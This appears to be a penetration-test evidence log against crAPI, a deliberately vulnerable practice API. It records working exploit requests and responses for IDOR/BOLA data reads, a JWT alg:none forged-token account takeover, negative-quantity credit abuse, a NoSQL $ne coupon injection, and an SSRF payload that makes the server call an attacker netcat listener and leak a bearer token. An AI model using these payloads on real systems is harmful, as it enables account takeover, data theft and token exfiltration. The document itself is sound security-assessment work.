# Evidence Log — crAPI

Raw request/response per finding, timestamped. Identities: attacker = `ram`
(`ram123@gmail.com`); victims = `admin@example.com`, `adam007@example.com`,
`suman@gmail.com`. Authorization findings show a baseline proving the object
belongs to another account. Screenshots in `evidence/F-00X/`.

---

## F-001 — IDOR on order details (`order_id`)

- `2026-10-21` · attacker `ram` · GET `/workshop/api/shop/orders/{id}` (UI `/orders?order_id=`)
- Baseline `order_id=6` → own order, `ram123@gmail.com` (Wheel, $10). `order6.png`
- Cross `order_id=5` → **`admin@example.com`**, phone `9010203040`, Seat, $20. `order5.png`
- Same `ram` session; order 5 belongs to another user. Read-only. Raw API capture (`/orders/5`) pending.

## F-002 — IDOR on mechanic report (`report_id`)

- `2026-10-21` · attacker `ram` · GET `/workshop/api/mechanic/mechanic_report?report_id={id}` (UI `/service-report?id=`)
- Baseline `id=6` → own report, `ram123@gmail.com`, VIN `H3JPUM31REF7826CM`. `report6.png`
- Cross `id=5` → owner **`adam007@example.com`**, mechanic `james@example.com`/`TRAC_JME`, VIN `7ECOX34KJTV359804`, phone `9876895423`. `report5.png`
- Exposed VIN is a chain lead into `service_requests/{VIN}`. Raw API capture pending.

## F-003 — JWT `alg:none` auth bypass / account takeover

- `2026-10-20T18:27–18:48` · attacker `ram` forging tokens · GET `/identity/api/v2/user/dashboard`
- Valid token: `alg=RS256`, `sub=ram123@gmail.com`. Forged: header `eyJhbGciOiJub25lIn0` = `{"alg":"none"}`, target `sub`, empty signature (via `jwt_tool -X a` / `edit_base64.py`).

Control — forged `sub=ram123@gmail.com`:
```http
GET /identity/api/v2/user/dashboard   Authorization: Bearer <alg:none, sub=ram123@gmail.com>
→ 200  {"id":8,"name":"ram","email":"ram123@gmail.com","available_credit":90.0,"role":"ROLE_USER"}
```
Takeover — forged `sub=suman@gmail.com` (no credentials held):
```http
GET /identity/api/v2/user/dashboard   Authorization: Bearer <alg:none, sub=suman@gmail.com>
→ 200  {"id":9,"name":"suman","email":"suman@gmail.com","number":"1234567891","available_credit":100.0}
```
- Different `id`/`number`/`credit` → authentication bypass. Screenshots (`evidence/F-003/`): `1-forged-ram-200.png`, `2-valid-vs-forged-token.png`, `3-jwttool-algnone.png`, `4-token-decoded-rs256.png`, `5-forge-victim-suman.png`, `6-forged-suman-200.png`, `7-forged-suman-payload.png`.

## F-004 — Unauthorized report download (`filename`)

- `2026-10-21T02:16` · attacker `ram` (RS256) · GET `/workshop/api/mechanic/download_report?filename={name}`
```http
GET ...?filename=report_6   Authorization: Bearer eyJhbGciOiJSUzI1NiJ9... (ram)
→ 200  Content-Disposition: inline; filename="report_6"   %PDF (owner ram123@gmail.com)

GET ...?filename=report_5   (SAME ram token)
→ 200  Content-Disposition: inline; filename="report_5"   %PDF (owner adam007@example.com, phone 9876895423)
```
- Same token, different owner → BOLA (not traversal; no `../` used). Screenshots (`evidence/F-004/`): `1-burp-report6-own.png`, `2-burp-report5-victim.png`, `3-pdf-report5-adam.png`, `4-pdf-report6-ram.png`.

## F-005 — Negative order quantity → account credit

- `2026-10-21T08:18–08:21` · attacker `ram` · POST `/workshop/api/shop/orders` (credit read via GET `/workshop/api/shop/products`)
- Model: `charge = price × quantity`; `quantity=-1, price=10 → charge=-10 → credit +10`.
- Before: `"credit":100.0` (`1-credit-100-before.png`). After order #1177: `"credit":110.0` (`2-credit-110-after.png`).
- +10 after a purchase is anomalous. **Gap:** order body showing `quantity=-1` not captured; mechanism inferred.

## F-006 — NoSQL operator injection (coupon)

- `2026-10-21T03:11` · authenticated `ram` · POST `/community/api/v2/coupon/validate-coupon`
```http
POST /community/api/v2/coupon/validate-coupon   {"coupon_code":{"$ne":"x"}}
→ 200  {"coupon_code":"TRAC075","amount":"75","CreatedAt":"2026-10-20T16:16:36.835Z"}
```
- Operator object returns a valid coupon → untyped input in Mongo query (C:H). Integrity (redemption) not captured. `1-coupon-ne-injection.png`

## F-007 — SSRF via `mechanic_api` + token leak

- `2026-10-21T09:56` · attacker `ram` · POST `/workshop/api/merchant/contact_mechanic`
```bash
curl -X POST .../contact_mechanic -H "Authorization: Bearer $TOKEN" -d \
 '{"mechanic_code":"TRAC_JHN","problem_details":"test","vin":"H3JPUM31REF7826CM",
   "mechanic_api":"http://172.17.0.1:9000/ssrf-test","repeat_request_if_failed":false,"number_of_repeats":1}'
```
Attacker listener (`nc -lvnp 9000`):
```
connect from [172.19.0.10]   (app container)
GET /ssrf-test?... HTTP/1.1   Host: 172.17.0.1:9000   User-Agent: python-requests/2.30.0
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9...   <-- caller token forwarded
```
- Server fetched the attacker URL (non-blind SSRF) and leaked the bearer token. Internal-only reach not demonstrated. `2-attack-request.png`, `1-listener-callback.png`
